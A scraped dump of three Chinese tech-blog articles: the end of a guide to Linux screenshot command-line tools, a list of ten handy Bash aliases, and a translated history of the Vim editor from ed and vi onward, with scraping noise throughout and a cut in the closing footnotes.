Screenshot 选项后，会看到几个控制点来控制屏幕截图范围。点击 “Snap” 截取屏幕截图，图像将自动显示在 GIMP 中可供编辑。,\n,方法 5：在 Linux 中使用命令行工具获取屏幕截图,\n,这一节内容仅适用于终端爱好者。如果你也喜欢使用终端，可以使用 “GNOME 截图工具”或 “ImageMagick” 或 “Deepin Scrot”，大部分流行的 Linux 发行版中都自带这些工具。,\n,要立即获取屏幕截图，可以执行以下命令：,\n,GNOME 截图工具（可用于 GNOME 桌面）,\n,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ngnome-screenshot,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,gnome,-,screenshot,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,GNOME 截图工具是使用 GNOME 桌面的 Linux 发行版中都自带的一个默认工具。如果需要延时获取屏幕截图，可以执行以下命令（这里的 ,5, 是需要延迟的秒数）：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ngnome-screenshot -d -5,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,gnome,-,screenshot, ,-,d, ,-,5,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,ImageMagick,\n,如果你的操作系统是 Ubuntu、Mint 或其它流行的 Linux 发行版，一般会自带 ,ImageMagick, 这个工具。如果没有这个工具，也可以按照,官方安装说明,使用安装源来安装。你也可以在终端中执行这个命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsudo apt-get install imagemagick,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,sudo ,apt,-,get ,install ,imagemagick,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,安装完成后，执行下面的命令就可以获取到屏幕截图（截取整个屏幕）：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nimport -window root image.png,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,import, ,-,window ,root ,image,.,png,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这里的 “image.png” 就是屏幕截图文件保存的名称。,\n,要获取屏幕一个区域的截图，可以执行以下命令:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nimport image.png,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,import ,image,.,png,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,Deepin Scrot,\n,Deepin Scrot 是基于终端的一个较新的截图工具。和前面两个工具类似，一般自带于 Linux 发行版中。如果需要自行安装，可以执行以下命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsudo apt-get install scrot,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,sudo ,apt,-,get ,install ,scrot,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,安装完成后，使用下面这些命令可以获取屏幕截图。,\n,获取整个屏幕的截图：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nscrot myimage.png,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,scrot ,myimage,.,png,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,获取屏幕某一区域的截图：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nscrot -s myimage.png,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,scrot, ,-,s, ,myimage,.,png,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,总结,\n,以上是一些在 Linux 上的优秀截图工具。当然还有很多截图工具没有提及（例如用于 KDE 发行版的 ,Spectacle,），但相比起来还是上面几个工具更为好用。,\n,如果你有比文章中提到的更好的截图工具，欢迎讨论！,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114435/", "url_object_id": "369e6ee22b9ca54772058d05fefc5e58", "front_image_path": "full/2f9e34046b96f59ca62fc50473cf79b97baeed4a.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/10/19b48ca9424d8c55554e0f79ce5d9aad.png"], "title": "10 个 Linux 中方便的 Bash 别名", "create_time": "2018/10/10", "vote": "1", "bookmark": "1", "comments": "1", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Patrick H. Mullins,   译文出处：,Linux中国/geekpi,   ,\n,你有多少次在命令行上输入一个长命令，并希望有一种方法可以保存它以供日后使用？这就是 Bash 别名派上用场的地方。它们允许你将长而神秘的命令压缩为易于记忆和使用的东西。需要一些例子来帮助你入门吗？没问题！,\n,要使用你创建的 Bash 别名，你需要将其添加到 ,.bash_profile, 中，该文件位于你的家目录中。请注意，此文件是隐藏的，并只能从命令行访问。编辑此文件的最简单方法是使用 Vi 或 Nano 之类的东西。,\n,10 个方便的 Bash 别名,\n,1、 你有几次遇到需要解压 .tar 文件但无法记住所需的确切参数？别名可以帮助你！只需将以下内容添加到 ,.bash_profile, 中，然后使用 ,untar FileName, 解压缩任何 .tar 文件。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nalias untar='tar -zxvf ',\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,alias ,untar,=,'tar -zxvf ',\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,2、 想要下载的东西，但如果出现问题可以恢复吗？,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nalias wget='wget -c ',\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,alias ,wget,=,'wget -c ',\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,3、 是否需要为新的网络帐户生成随机的 20 个字符的密码？没问题。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nalias getpass=\"openssl rand -base64 20\",\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,alias ,getpass,=,\"openssl rand -base64 20\",\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,4、 下载文件并需要测试校验和？我们也可做到。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nalias sha='shasum -a 256 ',\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,alias ,sha,=,'shasum -a 256 ',\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,5、 普通的 ,ping, 将永远持续下去。我们不希望这样。相反，让我们将其限制在五个 ,ping,。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nalias ping='ping -c 5',\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,alias ,ping,=,'ping -c 5',\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,6、 在任何你想要的文件夹中启动 Web 服务器。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nalias www='python -m SimpleHTTPServer 8000',\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,alias ,www,=,'python -m SimpleHTTPServer 8000',\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,7、 想知道你的网络有多快？只需下载 Speedtest-cli 并使用此别名即可。你可以使用 ,speedtest-cli --list, 命令选择离你所在位置更近的服务器。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nalias speed='speedtest-cli --server 2406 --simple',\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,alias ,speed,=,'speedtest-cli --server 2406 --simple',\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,8、 你有多少次需要知道你的外部 IP 地址，但是不知道如何获取？我也是。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nalias ipe='curl ipinfo.io/ip',\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,alias ,ipe,=,'curl ipinfo.io/ip',\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,9、 需要知道你的本地 IP 地址？,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nalias ipi='ipconfig getifaddr en0',\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,alias ,ipi,=,'ipconfig getifaddr en0',\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,10、 最后，让我们清空屏幕。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nalias c='clear',\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,alias, ,c,=,'clear',\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,如你所见，Bash 别名是一种在命令行上简化生活的超级简便方法。想了解更多信息？我建议你 Google 搜索“Bash 别名”或在 Github 中看下。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    , 1 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114440/", "url_object_id": "774ba0de1c2a64e3e30e586bbd39d283", "front_image_path": "full/90f0796a2e5c4bad34e6ed8cbc132e665e9a9b60.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2012/04/vim-logo.png"], "title": "一文带你了解 Vim 的起源", "create_time": "2018/10/24", "vote": "1", "bookmark": "2", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,本文由 ,伯乐在线, - ,Abandon_first, 翻译，,艾凌风, 校稿。未经许可，禁止转载！,英文出处：,TwoBitHistory,。欢迎加入,翻译组,。,我最近偶然发现了一种名为 Intel HEX 的文件格式。据我所知，Intel HEX 文件（使用,.hex, 扩展名）通过将二进制图像编码成十六进制数字行，使二进制图像不那么晦涩难懂。显然，当人们需要对微控制器进行编程或者将数据烧录进 ROM 时会用到这种文件。无论如何，当我第一次在 Vim 中打开一个 HEX 文件时，我发现了一些震惊的东西。至少对我来说，这种文件格式是非常深奥难懂的，但 Vim 已经掌握了它。HEX 文件的每一行都是一条被划分为不同字段的记录—— Vim 已经预先将每个字段显示成不同的颜色。,set ft, 吗? 我充满敬畏地发问。,filetype=hex,，Vim 得意地回答。,\n,Vim 无所不在且受众极其广泛，以至于其支持 HEX 文件也应该在预料之中。Mac OS 中预装了 Vim，同时，Linux 世界中也有很多 Vim 的支持者。即使那些讨厌 Vim 的人也对它很熟悉，因为太多的流行命令行工具默认使用 Vim，不熟悉 Vim 的用户往往身陷其中，这已经变成了一个 ,meme,。包括 Facebook 在内的一些大型网站，当你按下 ,j ,键时，会向下滚动，而当你按下 ,k ,键时，会向上滚动——这意味着 Vim 通过数字文化传播达到了难以想象的高水准。,\n,然而，Vim 也是谜一般的存在。例如，与人尽皆知的由 Facebook 开发和维护的 React 不同，Vim没有明显的发起人。尽管它如此常见和重要，但是似乎没有任何委员会或组织为 Vim 做出决策。你可以花几分钟去浏览 ,Vim 网站,，但却无法得知是谁创建了 Vim 或者为什么创建。如果只启动 Vim 不打开任何文件，你会看到 Vim 的启动消息，表明 Vim 是由”Bram Moolenaar 等人“开发的。但这并不能说明什么，Bram Moolenaar 到底是谁，他的神秘同伙又是谁？,\n,当我们求索上述问题的时候，也许更重要的是，为什么退出 Vim 需要输入,：wq,？当然，这是一个“写”操作，然后是一个“退出”操作，但这不是一个特别容易直观理解的约定。谁决定了复制文本应该被称为“ yanking ”？为什么,：%s/foo/bar/gc,是“查找和替换”的缩写？Vim 的特性如此武断，不可能是被编造出来的，那么它们又从何而来呢？,\n,就像众多情况一样，答案是从那个古老的计算机熔炉——,贝尔实验室开始,。从某种意义上说，Vim 只是一款被称为“ wq 文本编辑器”软件的最新版本。自 Unix 时代诞生以来，这个软件一直在不断地被开发和改进。,\n,Ken Thompson 创建了行编辑器,\n,1966 年，贝尔实验室聘用了 Ken Thompson 。Thompson 刚刚在加州大学伯克利分校完成了电气工程和计算机科学的硕士学位。在伯克利他使用一个名为 QED 的文本编辑器，该编辑器在 1965 到 1966 年间被开发用于伯克利分时系统。,1 ,Thompson 到达贝尔实验室后做的第一件事就是为麻省理工学院兼容分时系统重写 QED。他后来又为 Multics 项目写了另一个版本的QED。在重写过程中，他对程序进行了扩展，以便用户可以在文件中搜索某一行，并使用正则表达式进行替换。,2,\n,与伯克利的分时系统一样，由麻省理工学院、通用电气和贝尔实验室合作的 Multics 项目试图创建一个可行的商业分时操作系统。最终，AT&T 认为这个项目毫无进展并退出。在没有分时系统的情况下，Thompson 和贝尔实验室资深研究员 Dennis Ritchie，开始怀念分时系统所提供的“交互式计算的感觉”，并着手创建他们自己的版本，该版本最终发展成为 Unix。,3, 1969 年 8 月，在妻子和幼子外出去加州度假时，Thompson “给操作系统、shell、编辑器和汇编程序分别分配了一个星期”，将新系统的基本组件组合在一起。,4,\n,这个编辑器被称为 ,ed, 。它是基于 QED 的，但并不完全是 QED 的复现。 Thompson 决定放弃某些 QED 的功能，弱化了对常规的表达式的支持，因此 ed 只能理解相对简单的正则表达式。QED 允许用户打开多个缓冲区同时编辑多个文件，但是 ,ed, 一次只使用一个缓冲区。QED 可以执行包含命令的缓冲区，而 ,ed, 则不能。这些简化可能是必要的。Dennis Ritchie 曾说过，去掉 QED 的高级正则表达式是“并不大的损失”。,5,\n,ed, 现在是 POSIX 规范的一部分，所以如果你有一个符合 POSIX 的系统，你的电脑上就安装了 ,ed, 。现在，许多 ,ed, 命令都是 Vim 的一部分，因此，这就值得摆弄一番了。例如，你必须使用 ,w, 命令来写入磁盘缓冲区，必须使用 ,q, 命令来退出编辑器。这两个命令可以写在同一行命令中，也就是 ,wq,。,ed, 与 Vim 一样，是一个模态编辑器；若要从命令模式进入输入模式，取决于你试图如何转换文本，需使用 insert 命令（,i,）、append 命令（,a,）或 change 命令（,c,）。,ed, 还引入了,s/foo/bar/g,语法来查找和替换或“替换”文本。,\n,考虑到所有这些相似之处，你可能会认为大部分 Vim 用户可以流畅地使用 ,ed,。但 ,ed, 在另一个重要方面，和 Vim 一点也不相似。,ed, 是一个真正的行编辑。它被广泛应用于电传打字机时代。当 Ken Thompson 和 Dennis Ritchie 在 Unix 上调试程序时看起来是这样的：,\n,\n,ed, 不允许你编辑开放缓冲区中那些被其他行围绕的行，也不允许移动光标，因为 ,ed, 在每次修改的时候都必须重新打印整个文件。在1969年， ,ed, 没有任何机制来“清除”屏幕上的内容，因为”屏幕“就是一张纸，所有已经输出的东西都像是已经用墨水打印出来了。在必要的时候，你可以使用列表命令（,l,）要求 ,ed, 打印出一系列的行，但是大多数时候，你都是在你看不到的文本上操作。因此，使用 ,ed, 就像是尝试用一个低电量的手电筒在黑暗房间中摸索。每次你只能看到那么一点儿，所以必须尽最大努力去记住每件东西的位置。,\n,下面有一个 ,ed, 会话的例子。我添加了注释（在字符 ,#,之后）来解释了每一行，不过如果这些注释真的被输入，,ed, 并不会把它们当作注释并且会报错：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[sinclairtarget 09:49 ~]$ ed\r\ni                           # Enter input mode\r\nHello world!\r\n\r\nIsn't it a nice day?\r\n.                           # Finish input\r\n1,2l                        # List lines 1 to 2\r\nHello world!$\r\n$\r\n2d                          # Delete line 2\r\n,l                          # List entire buffer\r\nHello world!$\r\nIsn't it a nice day?$\r\ns/nice/terrible/g           # Substitute globally\r\n,l\r\nHello world!$\r\nIsn't it a terrible day?$\r\nw foo.txt                   # Write to foo.txt\r\n38                          # (bytes written)\r\nq                           # Quit\r\n[sinclairtarget 10:50 ~]$ cat foo.txt\r\nHello world!\r\nIsn't it a terrible day?,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,sinclairtarget, ,09,:,49, ,~,],$, ,ed,i,                           ,# Enter input mode,Hello ,world,!, ,Isn,'t it a nice day?,.                           # Finish input,1,2l                        # List lines 1 to 2,Hello world!$,$,2d                          # Delete line 2,,l                          # List entire buffer,Hello world!$,Isn',t, ,it, ,a, ,nice ,day,?,$,s,/,nice,/,terrible,/,g,           ,# Substitute globally,,,l,Hello ,world,!,$,Isn,'t it a terrible day?$,w foo.txt                   # Write to foo.txt,38                          # (bytes written),q                           # Quit,[sinclairtarget 10:50 ~]$ cat foo.txt,Hello world!,Isn',t, ,it, ,a, ,terrible ,day,?,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,正如你所看到的，,ed, 并不是一个特别友好的程序。,\n,Bill Joy 创建了文本编辑器,\n,对 Thompson 和 Ritchie 来说， ,ed, 已经足够好了。但是其他人则认为它很难用，而且它作为一个淋漓尽致地表现 Unix 对新手敌意的例子而臭名昭著。,6,在 1975 年，一个名叫 George Coulouris 的人在伦敦玛丽皇后学院的 Unix 系统上开发了一个改进版 ,ed, 。Coulouris 利用他在玛丽女王学院的视频显示器开发他的编辑器。与 ,ed, 不同的是，Coulouris 的程序允许用户编辑在屏幕中的一行代码，通过一次次击键的方式来操作行（想象一下在 Vim 中每次编辑一行）。 Thompson 拜访玛丽女王学院时，看到 Coulouris 已经写好的程序，驳斥道他不需要在编辑文件的时候看到它的状态。受此启发，Coulouris 将他的程序命名为 ,em,，或者“为凡人而生的编辑器”。,7,\n,\n,（,George Coulouris,）,\n,1976年，Coulouris 把 ,em, 引入了加州大学伯克利分校，在那里他用了一个夏天的时间在 CS 系访学。这是 Ken Thompson 离开伯克利去贝尔实验室工作十年之后的事了。在伯克利，Coulouris 遇到了 Bill Joy，一名伯克利软件发行公司（BSD）的研究生。Coulouris 斯向Joy 展示了 ,em,， Joy 以 Coulouris 的源代码为基础，为扩展 ,ed, 建立了一个名为 ,ex, 的改进版 ,ed,。1978年，1.1 版本的 ,ex, 与第 1 个版本的 BSD Unix 捆绑在一起。,ex, 在很大程度上与 ,ed, 兼容，但它增加了两种模式：一种“开放”模式，这种模式可以使 ,em, 单行编辑成为可能，还有一种“可见”模式，这种模式会占据整个屏幕，并且可以像我们今天所习惯的那样，对整个文件进行实时编辑。,\n,\n,（,Bill Joy,）,\n,1979 年的第 2 版 BSD 引入了一个名为 ,vi, 的可执行文件，它只在可视模式下打开 ,ex, 。,8,\n,ex,/,vi, （后来称为 ,vi,）建立了我们现在使用的 Vim 中大多数的约定，但这些约定当时并不是 ,ed, 的一部分。Bill Joy 使用的视频终端是 Lear Siegler ADM-3A，它的键盘没有光标键。而是，,h,、,j,、,k ,和 ,l ,键,上绘制光标键，所以 Bill Joy 在,vi, 中就使用这些键来进行光标移动。ADM-3A 键盘上 escape 键位置是今天我们所使用的键盘上的 tab 键，这也就解释了为什么这样一个难以够着的键会被用来实现像退出当前模式这么常见的操作。前缀命令的 ,:, ,字符同样也来自 ,i,，它在常规模式下（即运行 ,ex, 进入的模式）使用 ,:, 作为提示。这解决了一个 ,ed, 中被长期诟病的问题，也就是一旦启动之后，没有任何反馈信息向用户致以问候。在可见模式下，保存和退出需要使用现在仍在使用的经典 ,wq,。“Yanking”和“puttng”、标记、以及用于设置选项的 ,set, 命令都是原始 ,vi, 的一部分。我们今天在 Vim 中使用的的基本文本编辑过程，都是 ,vi, 中使用的特性。,\n,\n,vi, 是除 ,ed ,之外唯一与 BSD Unix 捆绑的文本编辑器。在那个时候，Emacs 可能会花费数百美元（这是在 GNU Emacs 之前），所以 ,vi, 变得非常流行。但是 ,vi, 是 ,ed, 的直接衍生版本，这意味着如果没有 AT&T 的源代码，源代码就不能被修改。这促使一些人创建了 ,vi, 的开源版本。 STEVIE （专门为 VI 爱好者的 ST 编辑器）出现于1987年，Elvis 出现于 1990 年，,nvi, 出现于 1994 年。其中一些克隆版本添加了额外的功能，如语法高亮和窗口分离。尤其是 Elvis ，它的许多功能被整合到 Vim 中，因为许多 Elvis 用户推动了这些功能的加入。,9),\n,Bram Moolenaar 创建了 Vim,\n,“Vim”现在是“改进版 Vi”的缩写，而最初代表的是“模拟版 Vi”。和其他许多“vi克隆版本”一样，Vim 始于在一个无法使用 ,vi, 的平台上复现 ,vi, 的一个尝试。在荷兰 Venlo 一家影印公司工作的软件工程师 Bram Moolenaar 想要为他全新的 Amiga 2000 准备一款类似于 ,vi, 的编辑器。Moolenaar 已经习惯了在大学时使用的 Unix 系统上的 ,vi, ，当时他 已经对,vi,了如指掌。,10 ,所以在 1988 年，Moolenaar 使用当时的 STEVIE ,vi,克隆版本开始在 Vim 上工作。,\n,\n,（,Bram Moolenaar,，2006 年加入 Google）,\n,Moolenaar 接触到 STEVIE 缘于其曾经出现在一个叫 Fred Fish 的磁盘上。Fred Fish 是一名美国程序员，每个月都会寄出一张软盘，内含为 Amiga 平台提供的精选可用开源软件。任何人只要支付邮费就可以得到一张这样的磁盘。有若干版本的 STEVIE 曾在 Fred Fish 磁盘上发布。Moolenaar 使用的 STEVIE 版本在 Fred Fish 256 号磁盘上发布。,11,（令人失望的是，Fred Fish 磁盘似乎与 ,Freddi Fish, 没有任何关系。）,\n,Moolenaar 喜欢 STEVIE，但很快就注意到其缺失了很多 ,vi, 命令。,12 ,因此，在第一次发布 Vim 时，Moolenaar 优先考虑了 ,vi, 的兼容性。当时已经有其他人编写了一系列的 ,vi, 宏，当运行一个合适的 ,vi, 兼容编辑器时，可以求解一个,随机生成的迷宫,。Moolenaar 能够让这些宏在 Vim 中运行。1991年，Vim 以 ,Vi模拟,为名第一次发布于 Fred Fish 591 号磁盘。,13 ,Moolenaar 添加了一些特性（包括多级撤销和解决编译器错误的“quickfix”模式），这意味着 Vim 已经完成了对 ,Vi, 的超越。在 1993 年通过 FTP 发布 Vim 2.0 之前，Vim 都仍以 ,Vi模拟, 的身份存在。,\n,在众多互联网合作者的帮助下，Moolenaar 稳健地在 Vim 中加入了一些功能。Vim 2.0 引入了对,wrap,选项的支持，以及对长行文本进行水平滚动的支持。受到了,vi,克隆,nvi,的启发，Vim 3.0 增加了对分割窗口和缓冲区的支持。Vim 现在还将每个缓冲区保存到交换文件中以避免程序崩溃造成文件丢失。Vimscript 支持语法高亮显示，第一次出现是在 Vim 5.0 中。与此同时，Vim 的受欢迎程度也在不断增长。它被移植到 MS-DOS、 Windows、Mac，甚至被移植到 Unix 与原来的 ,vi,竞争。,\n,2006 年，Vim 被 ,Linux Journal, 读者评为最受欢迎的编辑器。,14 ,如今，根据 2018 年 Stack Overflow 的开发者调查，Vim 是最受欢迎的文本模式（即终端模拟器）编辑器，受用于 25.8% 的软件开发人员(和 40% 的 Sysadmin / DevOps 人员)。,15, 在 1980 年代末和整个 1990 年代，程序员一度发起了“编辑器战争”，将 Emacs 用户与 ,vi, （即最终的 Vim ）用户进行了对比。虽然 Emacs 肯定仍有一些追随者，但有些人认为编辑器战争已经以 Vim 获胜而结束。,16 ,2018年 Stack Overflow 的开发者调查显示只有 4.1% 的受访者使用 Emacs，也验证了这个事实。,\n,Vim 是如何变得如此成功的？显然，人们喜欢 Vim 所提供的特性。但我认为，Vim 背后的悠久历史表明了它的优势远不仅仅体现在其功能集上。Vim 的代码库可以追溯到 1988 年，当时 Moolenaar 开始研究它。另一方面，“ wq 文本编辑器”——关于 Unix-y 文本编辑器应该如何工作的更广泛的愿景——可以追溯到半个世纪以前。“ wq 文本编辑器”有一些不同的具体表达方式，但在某种程度上要感谢 Bill Joy 和 Bram Moolenaar 对向后兼容性非比寻常的关注，才使好的想法逐渐积累起来。从这个意义上说，“ wq 文本编辑器”是运行时间最长、最成功的开源项目之一，得益于计算机世界中一些最伟大的思想贡献。我不认为“创业公司无视所有先例来创造颠覆性的新软件”的开发方式都是不妥的，但 Vim 提醒我们，这种协作和增量的方式同样能产生奇迹。,\n, ,\n,\n,@TwoBitHistory 每两周更新一次类似文章，如果你喜欢本文请在 Twitter 上关注或者订阅 RSS，以便及时知晓更新发布。伯乐在线已获授权同步翻译中文版，敬请关注,\n,\n,Butler Lampson, “Systems,” Butler Lampson, accessed August 5, 2018, ,http://bwlampson.site/Systems.htm,.,\n,Dennis Ritchie, “An Incomplete History of the QED Editor,” accessed August 5, 2018, ,https://www.bell-labs.com/usr/dmr/www/qed.html,.,\n,Peter Salus, “The Daemon, the GNU, and the Penguin,” Groklaw, April 14, 2005, accessed August 5, 2018, ,http://www.groklaw.net/article.php?story=20050414215646742,.,\n,ibid.,\n,Dennis Ritchie, “An Incomplete History of the QED Editor,” accessed August 5, 2018, ,https://www.bell-labs.com/usr/dmr/www/qed.html,.,\n,Donald Norman, “The Truth about Unix: The User Interface Is Horrid,” Datamation, accessed August 5, 2018, ,http://www.ceri.memphis.edu/people/smalley/ESCI7205_misc_files/The_truth_about_Unix_cleaned.pdf,.,\n,George Coulouris, “George Coulouris: A Bit of History,” George Coulouris’ Homepage, September 1998, accessed August 5, 2018, ,http://www.eecs.qmul.ac.uk/~gc/history/index.html,.,\n,“Second Berkeley Software Distribution Manual,” Roguelife, accessed August 5, 2018, ,http://roguelife.org/~fujita/COOKIES/HISTORY/2BSD/vi.u.html,.,\n,Sven Guckes, “VIM Wishlist,” Vmunix, May 15, 1995, accessed August 5, 2018, ,https://web.archive.org/web/20080520075925/http://www.vmunix.com/vim/wish.html,.,\n,Bram Moolenaar, 